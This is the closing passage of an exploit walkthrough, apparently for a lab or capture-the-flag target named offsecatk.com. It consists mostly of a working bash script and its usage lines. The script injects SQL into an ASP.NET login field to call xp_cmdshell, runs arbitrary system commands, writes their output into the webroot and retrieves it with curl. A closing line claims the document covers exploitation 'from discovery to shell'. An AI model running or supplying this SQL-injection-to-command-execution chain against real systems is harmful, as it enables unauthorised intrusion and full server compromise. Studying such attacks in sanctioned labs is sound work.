EV="%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D"

CMD="$1"
OUT="$2"

curl -X POST "$TARGET" \
  -d "__VIEWSTATE=$VS" \
  -d "__VIEWSTATEGENERATOR=$VSG" \
  -d "__EVENTVALIDATION=$EV" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC xp_cmdshell '$CMD > C:\\inetpub\\wwwroot\\$OUT';--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null

sleep 1
curl -s "http://offsecatk.com/$OUT"
```

**Usage:**
```bash
chmod +x sqli_exec.sh
./sqli_exec.sh "whoami" "out.txt"
./sqli_exec.sh "systeminfo" "sysinfo.txt"
./sqli_exec.sh "type C:\\inetpub\\wwwroot\\flag.txt" "flag.txt"
```

---

**This document provides every command needed to manually exploit offsecatk.com from discovery to shell without automated tools, with detailed progression explanations showing how each step builds on the previous one.**
